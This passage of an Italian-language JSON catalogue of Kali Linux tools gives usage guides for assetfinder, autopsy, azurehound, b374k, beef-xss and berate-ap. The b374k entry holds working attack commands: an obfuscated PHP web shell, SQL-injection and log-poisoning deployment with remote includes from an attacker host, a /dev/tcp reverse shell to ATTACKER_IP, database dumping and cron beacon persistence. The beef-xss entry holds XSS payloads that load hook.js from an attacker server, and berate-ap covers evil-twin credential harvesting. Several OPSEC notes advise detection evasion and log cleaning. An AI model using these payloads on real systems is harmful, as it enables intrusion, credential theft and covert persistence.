PPTP/MS-CHAPv2 e la necessità di migrare a IKEv2/IPsec o OpenVPN.</p><p>In <strong>Compliance Audit</strong>, identifica l'uso di protocolli non più considerati sicuri che violano best practice (NIST, PCI-DSS).</p><p>Per <strong>Red Team</strong>, le credenziali Wi-Fi enterprise spesso coincidono con quelle Active Directory, fornendo accesso alla rete interna.</p><p>In <strong>Security Awareness</strong>, demo pratica di perché \"enterprise WiFi = sicuro\" è un falso mito se usa protocolli obsoleti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requisiti Cattura:</strong> Necessario catturare un handshake completo. Per LEAP wireless, serve monitor mode e spesso deauthentication per forzare ri-autenticazione.</p><p><strong>Deauth Detection:</strong> I deauth frames sono rilevabili da WIDS (Wireless IDS). Limitare il numero e distanziare nel tempo.</p><p><strong>Password Strength:</strong> L'attacco è efficace solo se la password è nel dizionario. Password complesse richiedono CloudCracker o simili servizi.</p><p><strong>Alternative Moderne:</strong> PEAP con certificato client o EAP-TLS sono immuni a questo attacco. Verificare il metodo EAP effettivo.</p><p><strong>Tempo di Crack:</strong> Con tabelle pre-generate e password nel dizionario, il crack è istantaneo. Senza tabelle, genkeys richiede ore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "assetfinder",
    "name": "assetfinder",
    "version": "0.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/assetfinder/",
    "desc": "Trova sottodomini e asset correlati a un dominio usando fonti passive.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Assetfinder</strong> è un tool di subdomain enumeration passiva estremamente veloce, scritto in Go da tomnomnom. Interroga simultaneamente multiple fonti di dati pubblici - Certificate Transparency logs (crt.sh, Certspotter, Facebook CT), DNS passivo, e threat intelligence feeds (VirusTotal) - per raccogliere tutti i sottodomini storicamente associati a un dominio. Non invia MAI traffico diretto al target, garantendo zero footprint e stealth totale. L'output pulito (un risultato per riga) lo rende ideale per pipeline con altri tool di reconnaissance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Aggregation:</strong> Query parallele a crt.sh, Certspotter, HackerTarget, ThreatCrowd, URLScan, VirusTotal, Facebook CT per massima copertura.</p><p><strong>Certificate Transparency:</strong> Sfrutta i log CT obbligatori per tutti i certificati SSL pubblici - ogni certificato emesso rivela i domini associati.</p><p><strong>Related Domains:</strong> Trova anche domini correlati (stessa organizzazione, stesso certificato wildcard) oltre ai sottodomini diretti.</p><p><strong>Zero Footprint:</strong> Nessun traffico verso il target - tutte le query vanno a terze parti che indicizzano dati pubblici.</p><p><strong>Pipeline-Ready:</strong> Output pulito senza header/footer, un risultato per riga, deduplicato automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ENUMERAZIONE BASE ===\n# Tutti i domini correlati (include parent domain, related orgs)\nassetfinder target.com\n\n# Solo sottodomini stretti (esclude domini correlati)\nassetfinder --subs-only target.com\n\n# === PIPELINE RECONNAISSANCE ===\n# Enumera -> Verifica alive -> Scan vulnerabilità\nassetfinder --subs-only target.com | httprobe | nuclei -t cves/\n\n# Enumera -> Screenshot per review manuale\nassetfinder --subs-only target.com | httprobe | gowitness file -f -\n\n# Enumera -> Trova endpoint interessanti\nassetfinder --subs-only target.com | httprobe | waybackurls | grep -E '\\.(js|json|xml|config)$'\n\n# === MULTI-TARGET ===\n# Enumera lista di domini\ncat domains.txt | xargs -I{} assetfinder --subs-only {} | sort -u > all_subs.txt\n\n# Bug bounty scope check\ncat scope.txt | while read domain; do\n  echo \"=== $domain ===\"\n  assetfinder --subs-only $domain | wc -l\ndone\n\n# === OUTPUT E ANALISI ===\n# Salva e conta\nassetfinder --subs-only target.com | tee subs.txt | wc -l\n\n# Trova pattern comuni\nassetfinder --subs-only target.com | cut -d. -f1 | sort | uniq -c | sort -rn | head -20\n\n# Identifica ambienti (dev, staging, test)\nassetfinder --subs-only target.com | grep -E '(dev|test|stage|uat|qa|sandbox)'\n\n# === COMBINAZIONE CON ALTRI TOOL ===\n# Unisci risultati da più fonti\n(assetfinder --subs-only target.com; subfinder -d target.com -silent) | sort -u\n\n# Verifica quali risolvono\nassetfinder --subs-only target.com | dnsx -silent | httpx -silent\n\n# Enumera -> Portscan servizi comuni\nassetfinder --subs-only target.com | dnsx -silent -a | nmap -iL - -p80,443,8080,8443 -sV</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Primo passo in ogni <strong>Reconnaissance</strong> per ottenere rapidamente una baseline di asset noti prima di approfondire con tool attivi.</p><p>Per <strong>Bug Bounty</strong>, la velocità permette di enumerare decine di target in minuti. Pipeline con httprobe+nuclei trova vulnerabilità note automaticamente.</p><p>In <strong>Attack Surface Management</strong>, discovery periodica di nuovi sottodomini che appaiono nei CT logs.</p><p>Per <strong>Red Team</strong>, identifica sottodomini dimenticati (dev, test, old) che potrebbero avere configurazioni deboli.</p><p>In <strong>Threat Intelligence</strong>, i domini correlati rivelano infrastruttura collegata all'organizzazione target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Copertura Limitata:</strong> Dipende dalla completezza delle fonti esterne. Non trova sottodomini mai apparsi in certificati o DNS pubblico. Combinare con amass, subfinder, e brute force per copertura completa.</p><p><strong>Dati Storici:</strong> I risultati includono sottodomini che potrebbero non esistere più. Sempre verificare con dnsx/httprobe prima di procedere.</p><p><strong>Rate Limiting:</strong> Alcune fonti (VirusTotal) richiedono API key per query illimitate. Senza key, risultati parziali.</p><p><strong>Zero Footprint:</strong> Il target non vede alcun traffico, ma le fonti terze (crt.sh, etc.) loggano le query. Per anonimato, usare Tor o VPN.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "autopsy",
    "name": "autopsy",
    "version": "2.24",
    "icon": "../app/icons/autopsy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/autopsy/",
    "desc": "Piattaforma forense open source per analisi di immagini disco, timeline e carving.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Autopsy</strong> è la piattaforma forense digitale open source più utilizzata al mondo, sviluppata da Basis Technology. Fornisce un'interfaccia grafica completa per l'analisi di immagini disco, costruita sopra The Sleuth Kit (TSK) e integrata con decine di moduli specializzati. Permette agli investigatori di esaminare filesystem (NTFS, FAT, EXT, HFS+), recuperare file cancellati, costruire timeline di attività, analizzare artefatti di sistema (Registry, prefetch, eventi), browser, email e dispositivi mobili, tutto in un workflow documentabile per procedimenti legali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-User Collaboration:</strong> Supporta casi multi-investigatore con database centralizzato PostgreSQL per team che lavorano sullo stesso caso.</p><p><strong>Timeline Analysis:</strong> Costruisce cronologia unificata MAC times (Modified, Accessed, Changed) di tutti i file, eventi Windows, log applicativi per ricostruire sequenze di azioni.</p><p><strong>File Carving:</strong> Modulo PhotoRec integrato recupera file cancellati dallo spazio non allocato usando signature database di centinaia di formati.</p><p><strong>Artifact Extraction:</strong> Moduli specializzati per browser (Chrome, Firefox, Edge, IE), email (Outlook, Thunderbird), messaggistica (Skype, WhatsApp backup), social media e registry Windows.</p><p><strong>Hash Analysis:</strong> Calcola MD5/SHA1/SHA256 di ogni file, confronta con database di hash noti (NSRL, custom hashsets) per identificare file di sistema vs. rilevanti.</p><p><strong>Keyword Search:</strong> Indicizzazione full-text con Apache Solr, supporta regex, YARA rules, e ricerche su spazio non allocato.</p><p><strong>Reporting:</strong> Genera report HTML, Excel o custom template per documentazione legale con chain of custody.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO E SETUP ===\n# Avvio interfaccia grafica (Java-based)\nautopsy\n\n# === WORKFLOW TIPICO ===\n# 1. Case > New Case\n#    - Nome caso, numero, investigatore\n#    - Path per database e output\n\n# 2. Add Data Source\n#    - Disk Image (E01, raw, vmdk)\n#    - Local Disk (analisi live con write-blocker)\n#    - Logical Files (cartella o file singoli)\n\n# 3. Configure Ingest Modules\n#    Moduli raccomandati per casi generici:\n#    [x] Recent Activity (browser, download, USB)\n#    [x] Hash Lookup (NSRL per escludere file OS)\n#    [x] File Type Identification (magic bytes)\n#    [x] Extension Mismatch\n#    [x] Keyword Search (con lista custom)\n#    [x] Email Parser\n#    [x] Encryption Detection\n#    [x] PhotoRec Carver\n\n# 4. Analisi risultati\n#    - Views > File Types per categoria\n#    - Results > Extracted Content per artefatti\n#    - Timeline per sequenza eventi\n#    - Keyword Hits per ricerche\n\n# 5. Tagging e Reporting\n#    - Tag file rilevanti per inclusione nel report\n#    - Generate Report > HTML/Excel\n\n# === ANALISI SPECIFICHE ===\n# Trova file cancellati\nViews > Deleted Files\n\n# Analizza Registry\nResults > Extracted Content > Operating System Information\n\n# Timeline eventi\nTools > Timeline\n# Filtra per data range sospetto\n\n# Ricerca keyword custom\nKeyword Search > Add keyword list\n# Importa lista termini investigativi\n\n# === CLI INTEGRATION ===\n# The Sleuth Kit per analisi batch\nfls -r -p image.E01 > file_listing.txt\nicat image.E01 [inode] > extracted_file\ntsk_recover -e image.E01 output_dir/\n\n# === MULTI-USER SETUP ===\n# Server PostgreSQL per casi condivisi\n# Installare PostgreSQL e configurare in\n# Tools > Options > Multi-User</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per <strong>Digital Forensics</strong> in indagini di cybercrime, frode aziendale, e procedimenti penali con accettazione in tribunale.</p><p>In <strong>Incident Response</strong>, analisi di sistemi compromessi per ricostruire TTP dell'attaccante, identificare paziente zero, e timeline dell'intrusione.</p><p>Per <strong>eDiscovery</strong> legale, ricerca di documenti rilevanti in contenziosi civili con export documentato e verificabile.</p><p>In <strong>HR Investigations</strong>, analisi di workstation dipendenti per policy violations (uso improprio, data exfiltration).</p><p>Per <strong>Malware Analysis</strong>, estrazione di artefatti da sistemi infetti per identificare persistenza, C2, lateral movement.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Chain of Custody:</strong> Documentare ogni passo: chi ha acquisito l'immagine, hash di verifica, chi ha accesso al caso. Fondamentale per ammissibilità legale.</p><p><strong>Write Blocking:</strong> MAI collegare dischi originali senza hardware write-blocker. Usare sempre immagini forensi (E01, AFF4).</p><p><strong>Hash Verification:</strong> Verificare hash dell'immagine prima e dopo l'analisi per provare che non è stata modificata.</p><p><strong>Spazio Disco:</strong> Casi grandi richiedono molto spazio. Prevedere 2-3x la dimensione dell'immagine per database e carved files.</p><p><strong>Sensibilità Dati:</strong> I casi contengono dati personali/sensibili. Proteggere accesso al database e output con encryption.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "azurehound",
    "name": "azurehound",
    "version": "2.7.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/azurehound/",
    "desc": "Raccoglie dati da Azure AD per analisi con BloodHound, mappa relazioni e privilegi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>AzureHound</strong> è il collector ufficiale di BloodHound per ambienti Microsoft Azure e Entra ID (ex Azure AD), sviluppato da SpecterOps. Enumera l'intera struttura di identità e permessi del tenant Azure: utenti, gruppi, ruoli directory, App Registration, Service Principal, Managed Identity, e le loro relazioni RBAC su subscription, resource group e risorse individuali. I dati raccolti vengono importati in BloodHound per visualizzare graficamente i percorsi di attacco dal compromesso iniziale fino a Global Admin o Owner delle subscription.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Entra ID Collection:</strong> Enumera utenti, gruppi, ruoli directory (Global Admin, User Admin, ecc.), membership, Conditional Access Policies, e permessi delegati OAuth.</p><p><strong>Azure RM Enumeration:</strong> Mappa subscription, management group, resource group, VM, storage account, Key Vault e i relativi permessi RBAC per identificare chi può controllare cosa.</p><p><strong>Application & Service Principal:</strong> Enumera App Registration con permessi API Graph delegati/application, Service Principal con credenziali, Managed Identity associate a risorse.</p><p><strong>Privilege Escalation Paths:</strong> Identifica permessi pericolosi: Key Vault access, VM Contributor (code exec), Automation Contributor (runbook), Logic Apps (workflow abuse).</p><p><strong>Multiple Auth Methods:</strong> Supporta device code flow (bypass MFA), username/password, token esistente, certificato client, managed identity.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AUTENTICAZIONE ===\n# Device code flow (bypass MFA, richiede interazione utente)\nazurehound -u user@tenant.com\n# Seguire istruzioni per inserire codice su microsoft.com/devicelogin\n\n# Username/password (se no MFA)\nazurehound -u user@tenant.com -p 'Password123!'\n\n# Con access token esistente (da az cli, roadrecon, o token theft)\nazurehound --refresh-token \"0.AXkA...\" -t tenant-id\n\n# Service Principal con certificato (stealth)\nazurehound --cert /path/to/cert.pem --certpass P@ss \\\n  --app-id 00000000-0000-0000-0000-000000000000 --tenant tenant-id\n\n# === COLLECTION ===\n# Collection completa (tutti i dati)\nazurehound -u user@domain.com --output-dir ./azure_data/\n\n# Collection selettiva (riduce rumore e tempo)\nazurehound -u user@domain.com \\\n  --collect users,groups,roles,apps,servicePrincipals \\\n  --output-dir ./azure_data/\n\n# Solo Entra ID (no Azure RM)\nazurehound -u user@domain.com --collect-azuread-only\n\n# Solo Azure RM (no Entra ID)\nazurehound -u user@domain.com --collect-azurerm-only\n\n# === IMPORT IN BLOODHOUND ===\n# BloodHound CE (Community Edition)\nbloodhound-import ./azure_data/*.json\n\n# BloodHound Legacy (4.x)\n# Drag and drop JSON files nell'interfaccia web\n\n# === QUERY POST-IMPORT ===\n# Trova path verso Global Administrator\nMATCH p=shortestPath((n)-[*1..]->(m:AZRole {displayname:\"Global Administrator\"}))\nWHERE n.name =~ '(?i).*'\nRETURN p\n\n# Chi può resettare password di GA?\nMATCH (n)-[:AZResetPassword]->(m:AZUser)-[:AZHasRole]->(r:AZRole {displayname:\"Global Administrator\"})\nRETURN n,m,r\n\n# App con permessi pericolosi\nMATCH (n:AZApp)-[:AZMGAppRoleAssignment_ReadWrite_All]->(m)\nRETURN n,m\n\n# Owner di subscription\nMATCH (n)-[:AZOwner]->(m:AZSubscription)\nRETURN n.name, m.name\n\n# === INTEGRATION ===\n# Combina con ROADtools per analisi dettagliata\nroadrecon auth --device-code\nroadrecon gather\nroadrecon gui  # Visualizzazione alternativa\n\n# Combina con SharpHound per hybrid\nSharpHound.exe -c All\nazurehound -u syncuser@domain.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Cloud Pentesting</strong>, mappa tutti i percorsi di privilege escalation dal compromesso iniziale (phishing, password spray) fino a Global Admin o Owner delle subscription Azure.</p><p>Per <strong>Security Assessment</strong>, identifica permessi eccessivi su App Registration, Service Principal con credenziali non ruotate, e Managed Identity mal configurate.</p><p>In <strong>Hybrid AD Assessment</strong>, complementa SharpHound mappando la parte cloud delle identità sincronizzate con Azure AD Connect.</p><p>Per <strong>Incident Response</strong>, visualizza rapidamente cosa poteva raggiungere un account compromesso nel tenant.</p><p>In <strong>Compliance Review</strong>, documenta la matrice di permessi effettivi per audit SOX, PCI-DSS, SOC2.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging Azure:</strong> Tutte le chiamate Graph API e Azure RM sono loggate in Azure AD Sign-in logs e Activity logs. L'enumerazione massiva è visibile.</p><p><strong>Rilevamento Anomalo:</strong> Azure AD Identity Protection può flaggare comportamento anomalo (molte query in poco tempo).</p><p><strong>Token Scope:</strong> Usare token con scope minimo necessario. Device code flow richiede refresh token con scope ampio.</p><p><strong>Conditional Access:</strong> Alcune policy potrebbero bloccare l'accesso da location/device non riconosciuti.</p><p><strong>Rate Limiting:</strong> Microsoft Graph ha rate limit. Collection di tenant grandi può richiedere ore.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "b374k",
    "name": "b374k",
    "version": "3.2.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/b374k/",
    "desc": "Web shell PHP con file manager, terminale, DB client e funzioni di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>B374k</strong> è una web shell PHP avanzata e feature-rich per il post-exploitation di server web compromessi. Il nome deriva dal leet speak di 'BREAK'. Una volta caricata su un server vulnerabile, fornisce un'interfaccia web completa per controllare il sistema: file manager grafico con syntax highlighting, terminale interattivo pseudo-TTY, client database multi-engine, tool di rete (port scanner, reverse/bind shell), encoder/decoder, e funzionalità di esfiltrazione. È protetta da password con hashing e supporta compressione/offuscamento per ridurre detection.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Manager:</strong> Navigazione filesystem completa con upload (anche chunked per file grandi), download, editing con syntax highlighting, rename, chmod/chown, touch timestamp, operazioni bulk, search ricorsivo.</p><p><strong>Terminal Emulator:</strong> Pseudo-terminale nel browser per esecuzione comandi shell con history, autocomplete path, e supporto per comandi interattivi.</p><p><strong>Database Client:</strong> Supporto MySQL/MariaDB, PostgreSQL, SQLite, Oracle, MSSQL con query editor, export tabelle, gestione struttura.</p><p><strong>Network Tools:</strong> Port scanner, reverse shell (PHP, Perl, Python, Bash), bind shell, client TCP/UDP per tunneling manuale.</p><p><strong>Encoder/Decoder:</strong> Base64, hex, URL encode, ROT13, MD5/SHA hash - utili per data exfil e bypass.</p><p><strong>Process Manager:</strong> Lista processi, kill process, informazioni sistema dettagliate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GENERAZIONE SHELL ===\n# Shell base con password\nphp b374k.php -p 'MySecretPass' -o shell.php\n\n# Shell offuscata (evade signature base)\nphp b374k.php -p 'MySecretPass' -o shell.php -m  # minified\n\n# Shell compressa con gzip\nphp b374k.php -p 'MySecretPass' -o shell.php -z\n\n# Shell con nome funzione random\nphp b374k.php -p 'MySecretPass' -o shell.php -r\n\n# === DEPLOYMENT ===\n# Upload via vulnerabilità file upload\ncurl -F 'file=@shell.php' http://target.com/upload.php\n\n# Via SQL injection con INTO OUTFILE\nSELECT '<?php include(\"http://attacker/shell.php\");?>' INTO OUTFILE '/var/www/html/x.php'\n\n# Via LFI + Log Poisoning\ncurl -A '<?php include(\"http://attacker/shell.php\");?>' http://target.com/\n\n# === ACCESSO ===\n# Browser: http://target.com/uploads/shell.php\n# Inserire password configurata\n\n# === POST-EXPLOITATION ===\n# Nel terminale della shell:\n\n# Privilege escalation recon\nid; uname -a; cat /etc/passwd; sudo -l\n\n# Reverse shell upgrade a netcat\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Dump credenziali web app\ncat /var/www/html/config.php | grep -i pass\n\n# Database dump\nmysqldump -u root -p'found_pass' --all-databases > /tmp/dump.sql\n\n# Persistenza via cron\necho '* * * * * curl http://attacker/beacon.php' >> /var/spool/cron/www-data</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Web Exploitation</strong>, dopo aver ottenuto capacità di upload PHP (unrestricted file upload, RCE), b374k fornisce interfaccia completa per privilege escalation e lateral movement.</p><p>Per <strong>CTF Web Challenges</strong>, accelera l'interazione con server compromessi rispetto a reverse shell CLI.</p><p>In <strong>Red Team</strong>, permette persistenza web-based discreta (se offuscata) con accesso via browser normale.</p><p>Per <strong>Pentesting Report</strong>, le funzionalità integrate permettono di documentare rapidamente l'impatto (dump DB, file sensibili).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature Detection:</strong> B374k è pesantemente firmato da AV, WAF (ModSecurity), e file integrity monitoring. La versione stock viene rilevata immediatamente.</p><p><strong>Offuscamento:</strong> Usare -m -z -r insieme. Per evasion seria, riscrivere parti del codice o usare encoder custom (ionCube, Zend Guard crackati).</p><p><strong>Artefatti Forensi:</strong> Il file PHP su disco è evidenza immediata. Considerare web shell memory-only o inclusione remota.</p><p><strong>Logging Web Server:</strong> Ogni accesso alla shell appare nei log Apache/Nginx. Usare User-Agent credibile e considerare log rotation.</p><p><strong>Autorizzazione:</strong> L'uso non autorizzato di web shell è reato penale (accesso abusivo a sistema informatico).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "beef-xss",
    "name": "beef-xss",
    "version": "0.5.4.0",
    "icon": "../app/icons/beef-xss-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/beef-xss/",
    "desc": "Framework per sfruttare XSS: hooking browser, keylogging, phishing, pivoting client-side.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BeEF (Browser Exploitation Framework) è il framework di riferimento per trasformare vulnerabilità XSS in vettori di attacco completi. Una volta che la vittima esegue l'hook JavaScript (pochi KB), il suo browser diventa uno 'zombie' controllabile remotamente tramite pannello web. BeEF offre oltre 300 moduli per information gathering (fingerprint, IP interno via WebRTC, geolocation), credential theft (fake login, keylogger), social engineering (fake updates, clipboard hijack), exploitation (browser CVE, BeEF bind), e network reconnaissance (port scan interno, ping sweep). Il browser vittima diventa un pivot nella rete interna.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Browser Hooking:</strong> hook.js (~30KB) stabilisce websocket persistente con C2, sopravvive a navigazione nella stessa tab grazie a tecniche di persistence (iframes, popunders).</p><p><strong>Information Gathering:</strong> Fingerprint dettagliato: browser/OS, plugin (Flash, Java, Silverlight), internal IP via WebRTC STUN, visited URLs, cookie accessibili, geolocation HTML5.</p><p><strong>Credential Harvesting:</strong> Pretty Theft (fake login overlay), Clippy assistant, Google Phishing, Fake Flash update, form grabber.</p><p><strong>Social Engineering:</strong> Fake notification bars (Chrome, Firefox style), Tabnabbing, clickjacking frames, fake CAPTCHA.</p><p><strong>Network Reconnaissance:</strong> Port scanner JavaScript (timing attack), ping sweep, internal network mapper, fingerprint router admin pages.</p><p><strong>Browser Exploitation:</strong> Moduli per CVE specifiche di browser/plugin, WebRTC exploits, same-origin bypass.</p><p><strong>Persistence:</strong> Man-in-the-Browser via proxy injection, iFrame keylogger, event hooking.</p><p><strong>Tunneling:</strong> Usa il browser come proxy per raggiungere risorse interne (DNS rebinding, XSS tunnel).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO SERVER ===\n# Avvio BeEF (richiede Ruby)\nsudo beef-xss\n# Oppure da source\ncd /usr/share/beef-xss && ./beef\n\n# Console web: http://127.0.0.1:3000/ui/panel\n# Default: beef:beef (cambiare in config.yaml!)\n\n# === HOOK INJECTION ===\n# XSS Stored/Reflected - iniettare in pagina vulnerabile:\n<script src=\"http://ATTACKER_IP:3000/hook.js\"></script>\n\n# Via XSS con encoding bypass\n<img src=x onerror=\"var s=document.createElement('script');s.src='http://ATTACKER_IP:3000/hook.js';document.body.appendChild(s);\">\n\n# Con jQuery (se presente)\n$.getScript('http://ATTACKER_IP:3000/hook.js')\n\n# === CONFIGURAZIONE AVANZATA ===\n# config.yaml - cambio porta e credenziali\nbeef:\n  credentials:\n    user: \"admin\"\n    passwd: \"ComplexP@ss!\"\n  http:\n    port: 8080\n    public: \"attacker.com\"  # Per NAT/tunnel\n\n# Abilita moduli aggiuntivi\nextensions:\n  metasploit:\n    enable: true\n    host: \"127.0.0.1\"\n    port: 55552\n\n# === WORKFLOW POST-HOOK ===\n# 1. Browser appare in 'Online Browsers'\n# 2. Click su browser -> Details (fingerprint)\n# 3. Commands -> seleziona categoria\n\n# Moduli essenziali da eseguire:\n# - Browser > Get Cookie\n# - Browser > Get Internal IP (WebRTC)\n# - Host > Get System Info\n# - Network > Port Scanner (internal)\n# - Social Engineering > Pretty Theft (fake Google login)\n\n# === INTEGRAZIONE METASPLOIT ===\n# In msfconsole:\nload msgrpc ServerHost=127.0.0.1 ServerPort=55552 Pass=abc123\n\n# BeEF può ora lanciare exploit MSF direttamente sui browser\n# Commands > Exploits > seleziona exploit\n\n# === PERSISTENZA ===\n# Man-in-the-Browser (modifica tutte le form nella pagina)\nCommands > Persistence > Man-In-The-Browser\n\n# iFrame persistence (sopravvive a navigazione)\nCommands > Persistence > Confirm Close Tab\n\n# === PIVOTING ===\n# Usa browser come proxy per rete interna\n# Network > Internal Network Fingerprinting\n# Network > Cross Origin Scanner (trova API interne)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Pentesting</strong>, dimostra l'impatto reale di XSS oltre alert() - credential theft, session hijacking, lateral movement - per report più convincenti.</p><p>Per <strong>Red Team</strong>, stabilisce persistenza client-side usando browser di dipendenti come pivot per attaccare risorse interne non esposte.</p><p>In <strong>Phishing Campaigns</strong>, i moduli Pretty Theft producono overlay di login indistinguibili dagli originali.</p><p>Per <strong>Security Awareness</strong>, demo dal vivo dell'impatto XSS è più efficace di spiegazioni teoriche.</p><p>In <strong>Bug Bounty</strong>, catture BeEF nei report dimostrano criticità XSS, aumentando severity e payout.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature Detection:</strong> hook.js è firmato da molti AV web e WAF. Usare obfuscator JS o hosting su dominio trusted.</p><p><strong>CSP Bypass:</strong> Content-Security-Policy blocca script esterni. Verificare header CSP prima. Alcune bypass con JSONP callbacks.</p><p><strong>HTTPS/Mixed Content:</strong> Browser moderni bloccano script HTTP su pagine HTTPS. BeEF deve avere certificato valido.</p><p><strong>Network Detection:</strong> Websocket persistente verso IP sconosciuto è anomalo. Usare domain fronting o tunnel DNS.</p><p><strong>Short-Lived Sessions:</strong> Se vittima chiude tab/browser, connessione persa. Usare persistence modules per estendere.</p><p><strong>Logging:</strong> Tutte le interazioni sono loggate in BeEF. Pulire logs dopo engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "berate-ap",
    "name": "berate-ap",
    "version": "0.4.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/berate-ap/",
    "desc": "Crea access point malevoli per attacchi MITM su reti WiFi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Berate_ap è uno script Python che semplifica la creazione di access point malevoli (Rogue AP / Evil Twin) per attacchi Man-in-the-Middle su reti wireless. Automatizza la configurazione di hostapd (AP daemon), dnsmasq (DHCP/DNS), e iptables (NAT/forwarding) creando un AP funzionante in un singolo comando. Le vittime che si connettono navigano normalmente mentre tutto il traffico transita attraverso l'attaccante, permettendo intercettazione, injection, e credential harvesting. È progettato per integrarsi con tool MITM come mitmproxy, sslstrip, bettercap.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>One-Command Setup:</strong> Configura automaticamente hostapd.conf, dnsmasq.conf, regole iptables NAT, e IP forwarding del kernel.</p><p><strong>Flexible Networking:</strong> Supporta forwarding verso ethernet (eth0), altra WiFi, VPN, o tunnel - qualsiasi interfaccia con connettività.</p><p><strong>Custom SSID/Channel:</strong> Imposta nome rete e canale per impersonare reti esistenti (Evil Twin) o creare hotspot attraenti.</p><p><strong>DHCP Server:</strong> Assegna automaticamente IP alle vittime con DNS controllato (per DNS spoofing).</p><p><strong>Clean Teardown:</strong> Script di cleanup ripristina configurazioni originali alla chiusura.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP BASE ===\n# Crea AP \"FreeWiFi\" su wlan0, forwarding verso eth0\nsudo berate_ap wlan0 eth0 FreeWiFi\n\n# Con canale specifico (deve essere supportato dall'adapter)\nsudo berate_ap --channel 6 wlan0 eth0 CafeWiFi\n\n# === EVIL TWIN ===\n# Prima identifica rete target\nairodump-ng wlan0mon\n# Nota SSID, canale, BSSID\n\n# Crea Evil Twin con stesso nome\nsudo berate_ap --channel 11 wlan0 eth0 \"TargetCompany-Guest\"\n\n# Opzionale: deauth vittime dalla rete reale\nsudo aireplay-ng --deauth 5 -a [TARGET_BSSID] wlan1mon\n\n# === INTEGRAZIONE MITM ===\n# Avvia berate_ap, poi in altro terminale:\n\n# Con mitmproxy (HTTPS interception)\nmitmproxy -T --host\n# Configura iptables per redirect a mitmproxy\nsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080\nsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080\n\n# Con sslstrip (downgrade HTTPS)\nsslstrip -l 8080\nsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080\n\n# Con bettercap (all-in-one)\nsudo bettercap -iface wlan0 -caplet hstshijack/hstshijack\n\n# Con Wireshark (passive sniffing)\nwireshark -i wlan0 -k\n\n# === CAPTIVE PORTAL ===\n# Redirige tutto il traffico HTTP a pagina di phishing\nsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 80\npython3 -m http.server 80  # Serve phishing page\n\n# === WORKFLOW COMPLETO CREDENTIAL HARVEST ===\n# Terminal 1: AP\nsudo berate_ap wlan0 eth0 \"Free_Airport_WiFi\"\n\n# Terminal 2: Credential sniffer\nsudo tcpdump -i wlan0 -w capture.pcap\n# Oppure\nsudo bettercap -iface wlan0 -eval \"net.sniff on; set net.sniff.local true\"\n\n# Terminal 